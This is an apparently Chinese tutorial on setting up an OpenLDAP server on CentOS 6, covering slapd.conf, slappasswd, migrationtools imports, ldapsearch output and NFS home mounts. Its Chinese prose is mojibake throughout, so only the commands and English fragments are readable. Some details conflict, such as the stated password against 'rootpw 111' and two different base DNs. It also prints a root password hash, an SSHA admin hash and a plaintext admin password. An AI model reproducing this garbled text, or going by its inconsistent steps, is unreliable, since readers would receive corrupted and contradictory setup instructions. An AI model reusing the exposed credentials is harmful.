ä¹‹å,ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ·æ–°ç³»ç»ŸåŠ¨æ€é“¾æ¥åº“ç¼“å­˜:Berkeley DB æ•°æ®åº“å®‰è£…å®Œæ¯•ã€‚#### 3.è¿™é‡Œæˆ‘é€‰æ‹©yumä¸€é”®å®‰è£…å› ä¸ºcentosä¼šè‡ªåŠ¨å®‰è£…ä¸€äº›éœ€è¦çš„ä¾èµ–1.LDAP Server Setup:a.å®‰è£…LDAPæœåŠ¡ï¼ˆä½¿ç”¨YUMæœ¬åœ°å…‰ç›˜å®‰è£…ï¼‰ä¼šæç¤ºå®‰è£…ä»¥ä¸‹å‡ ä¸ªå¿…é¡»çš„åŒ…ï¼Œå¦å¤–é‰´äºä¾èµ–ï¼Œå¯èƒ½è¿˜ä¼šå®‰è£…ä¸€äº›å…¶ä»–çš„åŒ…ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©-yï¼š```bashopenldap-devel-2.4.23-26.el6.x86_64openldap-clients-2.4.23-26.el6.x86_64openldap-2.4.23-26.el6.x86_64openldap-servers-2.4.23-26.el6.x86_64# yum install -y vim automake autoconf gcc xz ncurses-devel \\ patch python-devel git python-pip gcc-c++ # å®‰è£…åŸºæœ¬ç¯å¢ƒï¼Œåé¢ä¾èµ–# yum install -y openldap openldap-servers openldap-clients openldap-devel å‰é¢ç¼–è¯‘å®‰è£…ä¹Ÿæåˆ°ï¼š OpenLDAP ä½¿ç”¨`Berkely-DB`æ¥ä½œä¸ºæ•°æ®åº“å­˜å‚¨ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å»å®˜ç½‘ä¸‹è½½è§£å‹åˆ°æœ¬åœ°å®‰è£…ã€‚But,ç”¨Yumçš„è¯ï¼Œåº”è¯¥ä¼šå¸®æˆ‘ä»¬åšå¥½è¿™ä¸€åˆ‡äº‹æƒ…ã€‚ æˆ‘ä»¬åªè¦åœ¨å®‰è£…å®Œåæ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å®‰è£…äº†db4*ç›¸å…³çš„rpmåŒ…å°±å¯ä»¥äº†ã€‚If true,é‚£æ­å–œï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥äº†ã€‚If not,è¯·ç”¨yumå‘½ä»¤å®‰è£…ã€‚ æŸ¥çœ‹rpmå®‰è£…åŒ…çš„å‘½ä»¤ï¼š`rpm -qa | grep db4` 123[root@openldap ~]# rpm -qa | grep db4db4-4.7.25-19.el6_6.x86_64db4-utils-4.7.25-19.el6_6.x86_64 ## 2. é…ç½® OpenLDAP æœåŠ¡å™¨ OpenLDAP çš„ä¸»é…ç½®æ–‡ä»¶æ˜¯`/etc/openldap/slapd.conf`,é…ç½® OpenLDAP æœåŠ¡å™¨ä¸»è¦æ˜¯å¯¹è¯¥æ–‡ä»¶ è¿›è¡Œä¿®æ”¹ã€‚ æ‹·è´LDAPé…ç½®æ–‡ä»¶åˆ°LDAPç›®å½• 12# cp /usr/share/openldap-servers/slapd.conf.obsolete /etc/openldap/slapd.conf ## è¯¥æ–‡ä»¶æ˜¯slapdçš„é…ç½®æ–‡ä»¶# cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG ## æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ Note: redhat6.0æˆ–6.1ç‰ˆæœ¬é…ç½®æ–‡ä»¶åœ¨ä¸»ç›®å½•æœ‰å¤‡ä»½ï¼š 12# cd /etc/openldap/# cp slapd.conf slapd.conf.bak #### é…ç½® slapd.conf æ–‡ä»¶ éœ€è¦æ³¨æ„çš„æ˜¯æ¯æ¬¡ä¿®æ”¹é…ç½®æ–‡ä»¶çš„è®¾ç½®å,éœ€é‡æ–°å¯åŠ¨ OpenLDAP æœåŠ¡åæ‰èƒ½ä½¿æ–°çš„é…ç½®ç”Ÿ æ•ˆã€‚æŒ‰ç…§ä»¥ä¸‹æ–¹æ³•é…ç½®/etc/openldap/slapd.conf æ–‡ä»¶ã€‚ #### è®¾ç½® Schema `Schema(æ¨¡å¼)`å®šä¹‰äº† LDAP ä¸­çš„å¯¹è±¡ç±»å‹ã€å±æ€§ã€è¯­æ³•å’ŒåŒ¹é…è§„åˆ™ç­‰,å¦‚ç”¨æˆ·çš„ç”µå­é‚®ä»¶ã€ è”ç³»åœ°å€å’Œè”ç³»ç”µè¯ç­‰å±æ€§,å®ƒç±»ä¼¼äºå…³ç³»æ•°æ®åº“ä¸­çš„è¡¨ç»“æ„ã€‚åœ¨å®é™…åº”ç”¨ä¸­,ä¸åŒçš„åº”ç”¨é¢†åŸŸ ä¼šæœ‰ä¸åŒçš„ Schema,ç”¨æˆ·å¯ä»¥é€šè¿‡è‡ªå®šä¹‰ Schema ä½¿ LDAP èƒ½å¤Ÿå­˜å‚¨å„ç§å„æ ·çš„ä¿¡æ¯ã€‚`OpenLDAP å®‰è£…ç›®å½•çš„/etc/openldap/schema`ç›®å½•ä¸‹åŒ…å«è®¸å¤šå¸¸ç”¨çš„ Schema å®šä¹‰æ–‡ä»¶(ä¾‹å¦‚,ç”¨äºè¡¨ç¤ºå•ä½ä¸­ äººå‘˜çš„ InetOrgPerson æ¨¡å¼),ä½¿ç”¨å®ƒä»¬å·²ç»å¯ä»¥æ»¡è¶³ä¸€èˆ¬æ€§åº”ç”¨çš„éœ€è¦ã€‚ 1234567891011121314[root@openldap openldap]# ll /etc/openldap/schema/*.schema-rw-r--r--. 1 root root 6190 5æœˆ 11 07:32 /etc/openldap/schema/collective.schema-rw-r--r--. 1 root root 8063 5æœˆ 11 07:32 /etc/openldap/schema/corba.schema-rw-r--r--. 1 root root 20499 5æœˆ 11 07:32 /etc/openldap/schema/core.schema-rw-r--r--. 1 root root 73994 5æœˆ 11 07:32 /etc/openldap/schema/cosine.schema-rw-r--r--. 1 root root 10388 5æœˆ 11 07:32 /etc/openldap/schema/duaconf.schema-rw-r--r--. 1 root root 3289 5æœˆ 11 07:32 /etc/openldap/schema/dyngroup.schema-rw-r--r--. 1 root root 6267 5æœˆ 11 07:32 /etc/openldap/schema/inetorgperson.schema-rw-r--r--. 1 root root 13901 5æœˆ 11 07:32 /etc/openldap/schema/java.schema-rw-r--r--. 1 root root 2387 5æœˆ 11 07:32 /etc/openldap/schema/misc.schema-rw-r--r--. 1 root root 7640 5æœˆ 11 07:32 /etc/openldap/schema/nis.schema-rw-r--r--. 1 root root 1514 5æœˆ 11 07:32 /etc/openldap/schema/openldap.schema-rw-r--r--. 1 root root 20467 5æœˆ 11 07:32 /etc/openldap/schema/pmi.schema-rw-r--r--. 1 root root 19963 5æœˆ 11 07:32 /etc/openldap/schema/ppolicy.schema ç¼–è¾‘ slapd.conf æ–‡ä»¶,å¦‚ä¸‹: ```bash # See slapd.conf(5) for details on configuration options. # This file should NOT be world readable. # include /etc/openldap/schema/corba.schema include /etc/openldap/schema/core.schema include /etc/openldap/schema/cosine.schema include /etc/openldap/schema/duaconf.schema include /etc/openldap/schema/dyngroup.schema include /etc/openldap/schema/inetorgperson.schema include /etc/openldap/schema/java.schema include /etc/openldap/schema/misc.schema include /etc/openldap/schema/nis.schema include /etc/openldap/schema/openldap.schema include /etc/openldap/schema/ppolicy.schema include /etc/openldap/schema/collective.schema å…¶ä¸­,core.schema æ˜¯æ‰€æœ‰ LDAP ç›®å½•æ‰€å¿…éœ€çš„,nis.schema æ–‡ä»¶ç”¨äºåœ¨ LDAP ç›®å½•æ–‡ä»¶ä¸­æ ä¾›ç½‘ç»œä¿¡æ¯ç³»ç»Ÿæ•°æ®ã€‚ä¸€èˆ¬è€Œè¨€,åœ¨ä¸èƒ½è‚¯å®šæ˜¯å¦éœ€è¦è¿™äº› schema æ–‡ä»¶æ—¶,ä¸åº”åˆ é™¤è¿™äº›æ–‡ä»¶ã€‚ 2.ä¿®æ”¹ç›®å½•æ ‘åç¼€ slapd.conf ä¸­,ç›®å½•æ ‘åç¼€ä¸º: suffix \"dc=my-domain,dc=com\" å°†å…¶ä¿®æ”¹ä¸º: suffix \"dc=ihaozhuo,dc=com\" 3.ä¿®æ”¹ç®¡ç†å‘˜ DNslapd.conf ä¸­,åŸ LDAP ä¿®æ”¹ç®¡ç†å‘˜ DN ä¸º: rootdn \"cn=Manager,dc=my-domain,dc=com\" å°†å…¶æ”¹ä¸º: rootdn \"cn=admin,dc=ihaozhuo,dc=com\" 123454.è®¾ç½®æ”¯æŒæ•°æ®åº“ å°†åŸå…ˆè®¾ç½®çš„æ•°æ®åº“: ```bash database ldbm ``` ä¿®æ”¹ä¸ºå·²å®‰è£…çš„BDB: ```bashdatabase bdb 5.ä½¿ç”¨ slappasswd å‘½ä»¤åˆ›å»ºåŠ å¯†å£ä»¤ åœ¨ slapd.conf æ–‡ä»¶ä¸­,éœ€è¦è¾“å…¥ä¿®æ”¹ OpenLDAP åå°æ•°æ®åº“æ‰€å¿…éœ€çš„å£ä»¤ã€‚é»˜è®¤æƒ…å†µä¸‹,åœ¨ slapd.conf æ–‡ä»¶ä¸­ä½¿ç”¨ rootpw è¯­å¥ä»¥æ˜æ–‡å­—ç¬¦ä¸²å®šä¹‰å£ä»¤ã€‚è¯¥å£ä»¤èµ‹äºˆå¯¹åå°æ•°æ®åº“çš„å®Œå…¨æ§åˆ¶ æƒé™ã€‚ 1# rootpw secret è‹¥å¸Œæœ›æŠŠåå°æ•°æ®åº“å£ä»¤æ”¹ä¸ºâ€œqwe123.comâ€,åˆ™ä½œå¦‚ä¸‹ä¿®æ”¹: 1rootpw 111 ä½†æ˜¯,æ˜æ–‡å­—ç¬¦ä¸²æ˜¯ä¸å®‰å…¨çš„,åº”å½“ä¸º OpenLDAP åˆ›å»ºåŠ å¯†å£ä»¤ã€‚åˆ›å»ºåŠ å¯†å£ä»¤ä½¿ç”¨ slappasswdå‘½ä»¤ã€‚åŠ å¯†æ–¹å¼æœ‰ SSHAã€MD5ã€SMD5ã€SSH ç­‰ã€‚ #### åˆ›å»ºLDAPç®¡ç†å‘˜å¯†ç  è¿™é‡Œæˆ‘è¾“å…¥çš„å¯†ç æ˜¯qwe123.com,è¾“å…¥å®Œå¯†ç å,è¿”å›ä¸€ä¸²å¯†æ–‡ï¼Œå…ˆä¿å­˜åˆ°å‰ªè´´æ¿,ä¹‹åè¦å¤åˆ¶åˆ°LDAPé…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨: 1234[root@openldap ]# slappasswdNew password:Re-enter new password:&#123;SSHA&#125;k2+3iWauGVNo8k2sKQbGAe/iUeaAq3Hk åˆ™ OpenLDAP åå°æ•°æ®åº“å°†ä½¿ç”¨åŠ å¯†å£ä»¤ã€‚ æ€»ç»“é…ç½®ï¼š 12345678910database bdbsuffix \"dc=ihaozhuo,dc=com\"checkpoint 1024 15rootdn \"cn=admin,dc=ihaozhuo,dc=com\"# Cleartext passwords, especially for the rootdn, should# be avoided. See slappasswd(8) and slapd.conf(5) for details.# Use of strong authentication encouraged.# rootpw secret# rootpw &#123;crypt&#125;ijFYNcSNctBYgrootpw &#123;SSHA&#125;k2+3iWauGVNo8k2sKQbGAe/iUeaAq3Hk åˆ°è¿™é‡Œå°±é…ç½®å®Œsldap.conf * è¯´æ˜ï¼š 123456789101112131415 loglevelï¼šè®¾ç½®æ—¥å¿—çº§åˆ« suffixï¼šå…¶å®å°±æ˜¯BaseDN rootdn:è¶…çº§ç®¡ç†å‘˜çš„dn rootpw:è¶…çº§ç®¡ç†å‘˜çš„å¯†ç ``` #### ä¿®æ”¹ç³»ç»Ÿæ—¥å¿—é…ç½®æ–‡ä»¶```bash# vim /etc/rsyslog.conf local4.* /var/log/ldap.log# local7.*ä¸‹æ·»åŠ ä¸€è¡Œåœ¨å¯åŠ¨æœåŠ¡ã€‚# service rsyslog restart ## 3. æµ‹è¯• slapd.conf è®¾ç½® å®Œæˆ slapd.conf æ–‡ä»¶çš„è®¾ç½®å,å¯ä»¥è¿è¡Œ slaptest å‘½ä»¤è¿›è¡Œæµ‹è¯•ã€‚å‘½ä»¤å¦‚ä¸‹: 12[root@openldap openldap]# slaptest -uconfig file testing succeeded å¦‚æœlapd.confæ–‡ä»¶è®¾ç½®ä¸æ­£ç¡®,å°†å‡ºç°`â€œslaptest: bad configuration file!â€`çš„æç¤º,åŒæ—¶æç¤º é”™è¯¯çš„è¡Œå·,æŒ‰ç…§æç¤ºè¿›è¡Œä¿®æ”¹å,è¿è¡Œ slaptest å‘½ä»¤é‡æ–°æ£€æŸ¥,ç›´åˆ°é…ç½®æ–‡ä»¶è®¾ç½®æ­£ç¡®ã€‚å¯[å‚è€ƒé“¾æ¥](http://www.oschina.net/question/137892_77767) #### OpenLDAP çš„å¯åŠ¨ä¸åœæ­¢ å¯åŠ¨slapd, æŸ¥çœ‹å¯åŠ¨æƒ…å†µ 1service slapd start å¦‚æœè·Ÿä¸‹é¢ä¸€æ ·æŠ¥é”™ errorå¯åŠ¨ slapdï¼š[å¤±è´¥] ä¸‹é¢æ˜¯è§£å†³æ–¹æ³•ï¼š 123456789[root@openldap openldap]# service slapd start/var/lib/ldap/__db.006 is not owned by \"ldap\" [è­¦å‘Š]/var/lib/ldap/__db.005 is not owned by \"ldap\" [è­¦å‘Š]/var/lib/ldap/__db.004 is not owned by \"ldap\" [è­¦å‘Š]/var/lib/ldap/__db.003 is not owned by \"ldap\" [è­¦å‘Š]/var/lib/ldap/alock is not owned by \"ldap\" [è­¦å‘Š]/var/lib/ldap/__db.001 is not owned by \"ldap\" [è­¦å‘Š]/var/lib/ldap/__db.002 is not owned by \"ldap\" [è­¦å‘Š]æ­£åœ¨å¯åŠ¨ slapdï¼š [å¤±è´¥] è§£å†³æ–¹æ³•ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253è¿›å…¥ cd /var/lib/ldap/ slapd (ä¼šç”Ÿæˆä¸€äº›åº“æ–‡ä»¶)[root@openldap ldap]# llæ€»ç”¨é‡ 11312-rw-r--r--. 1 root root 2048 9æœˆ 28 15:41 alock-rw-------. 1 root root 24576 9æœˆ 28 15:41 __db.001-rw-------. 1 root root 9093120 9æœˆ 28 15:41 __db.002-rw-------. 1 root root 335552512 9æœˆ 28 15:41 __db.003-rw-------. 1 root root 2359296 9æœˆ 28 15:37 __db.004-rw-------. 1 root root 753664 9æœˆ 28 15:41 __db.005-rw-------. 1 root root 32768 9æœˆ 28 15:41 __db.006-rw-r--r--. 1 root root 845 9æœˆ 28 15:06 DB_CONFIG[root@openldap ldap]# slapd[root@openldap ldap]# llæ€»ç”¨é‡ 11472-rw-r--r--. 1 root root 2048 9æœˆ 28 15:51 alock-rw-------. 1 root root 24576 9æœˆ 28 15:51 __db.001-rw-------. 1 root root 9093120 9æœˆ 28 15:51 __db.002-rw-------. 1 root root 335552512 9æœˆ 28 15:51 __db.003-rw-------. 1 root root 2359296 9æœˆ 28 15:51 __db.004-rw-------. 1 root root 753664 9æœˆ 28 15:51 __db.005-rw-------. 1 root root 32768 9æœˆ 28 15:51 __db.006-rw-r--r--. 1 root root 845 9æœˆ 28 15:06 DB_CONFIG-rw-------. 1 root root 8192 9æœˆ 28 15:51 dn2id.bdb-rw-------. 1 root root 32768 9æœˆ 28 15:51 id2entry.bdb-rw-------. 1 root root 10485760 9æœˆ 28 15:51 log.0000000001[root@openldap ldap]# netstat -ntlp | grep 389tcp 0 0 0.0.0.0:389 0.0.0.0:* LISTEN 1859/slapdtcp 0 0 :::389 :::* LISTEN 1859/slapd[root@openldap ldap]# chown ldap:ldap *[root@openldap ldap]# chmod 600 *[root@openldap ldap]# llæ€»ç”¨é‡ 11472-rw-------. 1 ldap ldap 2048 9æœˆ 28 15:55 alock-rw-------. 1 ldap ldap 24576 9æœˆ 28 15:55 __db.001-rw-------. 1 ldap ldap 9093120 9æœˆ 28 16:25 __db.002-rw-------. 1 ldap ldap 335552512 9æœˆ 28 15:55 __db.003-rw-------. 1 ldap ldap 2359296 9æœˆ 28 16:10 __db.004-rw-------. 1 ldap ldap 753664 9æœˆ 28 15:55 __db.005-rw-------. 1 ldap ldap 32768 9æœˆ 28 16:10 __db.006-rw-------. 1 ldap ldap 845 9æœˆ 28 15:06 DB_CONFIG-rw-------. 1 ldap ldap 8192 9æœˆ 28 15:51 dn2id.bdb-rw-------. 1 ldap ldap 32768 9æœˆ 28 15:51 id2entry.bdb-rw-------. 1 ldap ldap 10485760 9æœˆ 28 16:10 log.0000000001[root@openldap ldap]# service slapd restartåœæ­¢ slapdï¼š [ç¡®å®š]æ­£åœ¨å¯åŠ¨ slapdï¼š [ç¡®å®š][root@openldap ldap]# service slapd startæ­£åœ¨å¯åŠ¨ slapdï¼šln: åˆ›å»ºç¡¬é“¾æ¥\"/var/run/slapd.pid\": æ–‡ä»¶å·²å­˜åœ¨[root@openldap ldap]# service slapd statusslapd (pid 2197) æ­£åœ¨è¿è¡Œ...You have new mail in /var/spool/mail/root åœ¨ä¸‹ä¸€æ­¥æ‰§è¡Œï¼š # rm -rf /etc/openldap/slapd.d/* æµ‹è¯•å¹¶ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼š slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.d è¿”å›config file testing succeeded,åˆ™é…ç½®æˆåŠŸã€‚ èµ‹äºˆç”Ÿæˆçš„é…ç½®æ–‡ä»¶äºˆæƒé™å¹¶é‡å¯ï¼š 12345# chown -R ldap:ldap /etc/openldap/slapd.d# service slapd restartnetstat -tulnp | grep slapdtcp 0 0 0.0.0.0:389 0.0.0.0:* LISTEN 2358/slapdtcp 0 0 :::389 :::* LISTEN 2358/slapd ## 4.åˆ›å»ºä¸€ä¸ªè´¦å·ï¼Œä»¥å¤‡å®¢æˆ·ç«¯æµ‹è¯•ç™»é™† 12# useradd ldapuser1# passwd ldapuser1 è‡³æ­¤ï¼Œè¿™äº›ç”¨æˆ·ä»…ä»…æ˜¯ç³»ç»Ÿä¸Šå­˜åœ¨çš„ç”¨æˆ·`ï¼ˆå­˜å‚¨åœ¨/etc/passwdå’Œ/etc/shadowä¸Šï¼‰`ï¼Œå¹¶æ²¡æœ‰åœ¨LDAPæ•°æ®åº“é‡Œï¼Œæ‰€ä»¥è¦æŠŠè¿™äº›ç”¨æˆ·å¯¼å…¥åˆ°LDAPé‡Œé¢å»ã€‚ä½†LDAPåªèƒ½è¯†åˆ«ç‰¹å®šæ ¼å¼çš„æ–‡ä»¶ å³åç¼€ä¸ºldifçš„æ–‡ä»¶ï¼ˆä¹Ÿæ˜¯æ–‡æœ¬æ–‡ä»¶ï¼‰ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ä½¿ç”¨`etc/passwdå’Œ/etc/shadowã€‚` éœ€è¦migrationtoolsè¿™ä¸ªå·¥å…·æŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶è½¬å˜æˆLDAPèƒ½è¯†åˆ«çš„æ–‡ä»¶ã€‚ ## 5. å®‰è£…é…ç½®migrationtools yum install migrationtools -y #### è¿›å…¥migrationtoolé…ç½®ç›®å½• 123456789101112131415161718#cd /usr/share/migrationtools/é¦–å…ˆç¼–è¾‘migrate_common.ph# vi migrate_common.ph...# Default DNS domain$DEFAULT_MAIL_DOMAIN = \"ihaozhuo.com\";# Default base$DEFAULT_BASE = \"dc=ihaozhuo,dc=com\";.....ä¿å­˜é€€å‡ºã€‚ï¼š-ï¼‰K.ä¸‹é¢åˆ©ç”¨plè„šæœ¬å°†/etc/passwd å’Œ/etc/shadowç”ŸæˆLDAPèƒ½è¯»æ‡‚çš„æ–‡ä»¶æ ¼å¼ï¼Œä¿å­˜åœ¨/tmp/ä¸‹# ./migrate_base.pl &gt; /tmp/base.ldif# ./migrate_passwd.pl /etc/passwd &gt; /tmp/passwd.ldif# ./migrate_group.pl /etc/group &gt; /tmp/group.ldif #### è¯´æ˜ï¼š ç¬¬ä¸€æ¬¡å¯åŠ¨ç”Ÿä¼šåˆå§‹åŒ–ldapæ•°æ®åº“ï¼Œåœ¨/var/lib/ldapä¸­ï¼Œå¦‚æœæƒ³åˆ é™¤ldapæ•°æ®åº“å°±åˆ é™¤è¯¥ç›®å½•ï¼Œä¿ç•™DB_CONFIGé…ç½®æ–‡ä»¶ã€‚æ–°ç‰ˆçš„ldapä½¿ç”¨çš„æ˜¯/etc/openldap/slapd.d ä¸‹çš„é…ç½®æ–‡ä»¶ï¼Œåˆ é™¤åŸæ¥çš„é…ç½®æ–‡ä»¶ï¼Œslaptestæ˜¯é‡æ–°ç”Ÿæˆæ–°çš„é…ç½®æ–‡ä»¶. ## 6.å¯¼å…¥æ•°æ® ä¸‹é¢å°±è¦æŠŠè¿™ä¸‰ä¸ªæ–‡ä»¶å¯¼å…¥åˆ°LDAPï¼Œè¿™æ ·LDAPçš„æ•°æ®åº“é‡Œå°±æœ‰äº†æˆ‘ä»¬æƒ³è¦çš„ç”¨æˆ· 1234# ldapadd -x -D \"cn=admin,dc=example,dc=com\" -W -f /tmp/base.ldif# ldapadd -x -D \"cn=admin,dc=example,dc=com\" -W -f /tmp/passwd.ldif# ldapadd -x -D \"cn=admin,dc=example,dc=com\" -W -f /tmp/group.ldifè¿‡ç¨‹è‹¥æ— æŠ¥é”™ï¼Œåˆ™LDAPæœåŠ¡ç«¯é…ç½®å®Œæ¯•. æ‰§è¡ŒæˆåŠŸä¼šå‡ºç°ï¼š 1234567891011121314151617181920212223242526272829303132333435[root@openldap migrationtools]# ldapadd -x -D \"cn=admin,dc=ihaozhuo,dc=com\" -W -f /tmp/base.ldifEnter LDAP Password:adding new entry \"dc=ihaozhuo,dc=com\"adding new entry \"ou=Hosts,dc=ihaozhuo,dc=com\"adding new entry \"ou=Rpc,dc=ihaozhuo,dc=com\"adding new entry \"ou=Services,dc=ihaozhuo,dc=com\"adding new entry \"nisMapName=netgroup.byuser,dc=ihaozhuo,dc=com\".........[root@openldap migrationtools]# ldapadd -x -D \"cn=admin,dc=ihaozhuo,dc=com\" -W -f /tmp/passwd.ldifEnter LDAP Password:adding new entry \"uid=root,ou=People,dc=ihaozhuo,dc=com\"adding new entry \"uid=bin,ou=People,dc=ihaozhuo,dc=com\"adding new entry \"uid=daemon,ou=People,dc=ihaozhuo,dc=com\"adding new entry \"uid=adm,ou=People,dc=ihaozhuo,dc=com\"adding new entry \"uid=lp,ou=People,dc=ihaozhuo,dc=com\"adding new entry \"uid=sync,ou=People,dc=ihaozhuo,dc=com\".....[root@openldap migrationtools]# ldapadd -x -D \"cn=admin,dc=ihaozhuo,dc=com\" -W -f /tmp/group.ldifEnter LDAP Password:adding new entry \"cn=root,ou=Group,dc=ihaozhuo,dc=com\"adding new entry \"cn=bin,ou=Group,dc=ihaozhuo,dc=com\"....... ldapsearch æŸ¥çœ‹æ•°æ® 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128[root@openldap migrationtools]# ldapsearch -x -b \"dc=ihaozhuo,dc=com\"# extended LDIF## LDAPv3# base &lt;dc=ihaozhuo,dc=com&gt; with scope subtree# filter: (objectclass=*)# requesting: ALL## ihaozhuo.comdn: dc=ihaozhuo,dc=comdc: ihaozhuoobjectClass: topobjectClass: domain# Hosts, ihaozhuo.comdn: ou=Hosts,dc=ihaozhuo,dc=comou: HostsobjectClass: topobjectClass: organizationalUnit# Rpc, ihaozhuo.comdn: ou=Rpc,dc=ihaozhuo,dc=comou: RpcobjectClass: topobjectClass: organizationalUnit# Services, ihaozhuo.comdn: ou=Services,dc=ihaozhuo,dc=comou: ServicesobjectClass: topobjectClass: organizationalUnit# netgroup.byuser, ihaozhuo.comdn: nisMapName=netgroup.byuser,dc=ihaozhuo,dc=comnisMapName: netgroup.byuserobjectClass: topobjectClass: nisMap# Mounts, ihaozhuo.comdn: ou=Mounts,dc=ihaozhuo,dc=comou: MountsobjectClass: topobjectClass: organizationalUnit# Networks, ihaozhuo.comdn: ou=Networks,dc=ihaozhuo,dc=comou: NetworksobjectClass: topobjectClass: organizationalUnit# People, ihaozhuo.comdn: ou=People,dc=ihaozhuo,dc=comou: PeopleobjectClass: topobjectClass: organizationalUnit# Group, ihaozhuo.comdn: ou=Group,dc=ihaozhuo,dc=comou: GroupobjectClass: topobjectClass: organizationalUnit# Netgroup, ihaozhuo.comdn: ou=Netgroup,dc=ihaozhuo,dc=comou: NetgroupobjectClass: topobjectClass: organizationalUnit# Protocols, ihaozhuo.comdn: ou=Protocols,dc=ihaozhuo,dc=comou: ProtocolsobjectClass: topobjectClass: organizationalUnit# Aliases, ihaozhuo.comdn: ou=Aliases,dc=ihaozhuo,dc=comou: AliasesobjectClass: topobjectClass: organizationalUnit# netgroup.byhost, ihaozhuo.comdn: nisMapName=netgroup.byhost,dc=ihaozhuo,dc=comnisMapName: netgroup.byhostobjectClass: topobjectClass: nisMap# root, People, ihaozhuo.comdn: uid=root,ou=People,dc=ihaozhuo,dc=comuid: rootcn: rootobjectClass: accountobjectClass: posixAccountobjectClass: topobjectClass: shadowAccountuserPassword:: e2NyeXB0fSQ2JHJCNmVjYmdEZGtUR2w1c3QkTldDc1NQNXJBYXU3QkhpUWlXVXl LaXl4dW9VNWtFNm0wZ1dILmRzaXhFL2ZPTG1zOC52OTdNdXVuNkZlNjhDOExTYmtvVjdiaW03Lmti ak1ZbURVZC4=shadowLastChange: 17056shadowMin: 0shadowMax: 99999shadowWarning: 7loginShell: /bin/bashuidNumber: 0gidNumber: 0homeDirectory: /rootgecos: root# bin, People, ihaozhuo.comdn: uid=bin,ou=People,dc=ihaozhuo,dc=comuid: bincn: binobjectClass: accountobjectClass: posixAccountobjectClass: topobjectClass: shadowAccountuserPassword:: e2NyeXB0fSo=shadowLastChange: 15980shadowMin: 0shadowMax: 99999shadowWarning: 7loginShell: /sbin/nologinuidNumber: 1gidNumber: 1homeDirectory: /bingecos: bin................ /ç›¸å…³ä¿¡æ¯å¯¼å…¥æ•°æ®åº“æˆåŠŸ ## 7.å®ç°LDAPç”¨æˆ·homeç›®å½•è‡ªåŠ¨æŒ‚è½½ 1234567891011121314151617181920212223centos 6 :yum install nfs-utils rpcbindæœåŠ¡å™¨ç«¯ï¼š ###(å»ºç«‹æŒ‚è½½çš„ç›®å½•ï¼Œå¹¶ä¸”æŒ‚è½½ç›®å½•ã€‚)[root@openldap ~]# mkdir /opt/centos6[root@openldap ~]# cd /opt/centos6/[root@openldap centos6]# mkdir thisISnfsFile[root@openldap centos6]# vi /etc/exports[root@openldap centos6]# chkconfig nfs on[root@openldap centos6]# /etc/init.d/rpcbind startæ­£åœ¨å¯åŠ¨ rpcbindï¼š [ç¡®å®š][root@openldap centos6]# /etc/init.d/nfs startå¯åŠ¨ NFS æœåŠ¡ï¼š [ç¡®å®š]å¯åŠ¨ NFS mountdï¼š [ç¡®å®š]å¯åŠ¨ NFS å®ˆæŠ¤è¿›ç¨‹ï¼š [ç¡®å®š]æ­£åœ¨å¯åŠ¨ RPC idmapdï¼š [ç¡®å®š][root@openldap centos6]# cat /etc/exports/opt/centos6 *(rw,sync)### å¤‡æ³¨ï¼š/opt/centos6è¡¨ç¤ºnfså…±äº«çš„ç›®å½• æœ‰è¯»å†™æƒé™ã€‚è¿™ä¸ªå¯ä»¥ä¸éœ€è¦å†™ï¼š/opt/centos6 192.168.1.0/24(ro,no_root_squash)### å¤‡æ³¨:/opt/centos6è¡¨ç¤ºnfså…±äº«çš„ç›®å½• 192.168.1.0-192.168.1.254åŒºé—´çš„IPå¯ä»¥è®¿é—®ï¼Œè®¿é—®æƒé™æ˜¯è‡ªè¯»ï¼Œroot ç”¨æˆ· å¯å‚è€ƒï¼š[Nfså…±äº«åŒæ­¥](http://blog.chinaunix.net/uid-26284318-id-3111651.html) ## 8.ä½¿ç”¨ phpLDAPadmin OpenLDAP å®‰è£…ç›®å½•çš„ bin å­ç›®å½•ä¸‹æä¾›äº†ç®¡ç†ç›®å½•æ ‘çš„å®¢æˆ·ç«¯å‘½ä»¤(å¦‚ ldapaddã€ldapdelete å’Œ ldapsearch ç­‰),ä½†å¯¹äºä¸ç†Ÿæ‚‰ OpenLDAP å‘½ä»¤çš„åˆå­¦è€…è€Œè¨€,ä½¿ç”¨å®ƒä»¬å»ç®¡ç†ç›®å½•æ ‘æ˜¯ä¸€ä»¶é å¸¸éº»çƒ¦çš„äº‹ã€‚å¯ä»¥å€ŸåŠ©äºå›¾å½¢ç•Œé¢çš„ LDAPç®¡ç†å·¥å…·æ¥ç®¡ç†ç›®å½•æ ‘,å…¶ä¸­,ç”¨ PHP ç¼–å†™çš„ phpLDAPadmin å°±æ˜¯ä¸€æ¬¾å¾ˆå¥½çš„é€‰æ‹©ã€‚ 1.1 åˆå§‹åŒ–æ•°æ® ä¸ºäº†èƒ½ä½¿ç”¨ phpLDAPadmin ç®¡ç†ç›®å½•æ ‘,éœ€è¦ä¸ºç›®å½•æ ‘å»ºç«‹åˆå§‹åŒ–æ•°æ®,æ–¹æ³•æ˜¯å°†åˆå§‹åŒ–æ•° æ®ä¿å­˜åœ¨ LDIF æ–‡ä»¶ä¸­,ç„¶åä½¿ç”¨ ldapadd å‘½ä»¤å¯¼å…¥ LDAP çš„æ•°æ®åº“ä¸­ã€‚ LDIF æ˜¯ LDAP Data Interchange Format (å³ LDAP æ•°æ®äº¤æ¢æ ¼å¼)çš„ç¼©å†™ã€‚å°† LDAP ä¿å­˜ä¸º ä¸€ç§ç®€å•çš„æ–‡æœ¬æ ¼å¼,è¯¥æ ¼å¼å¯ä»¥ç”¨äºåœ¨ç¬¦åˆ LDAP æ 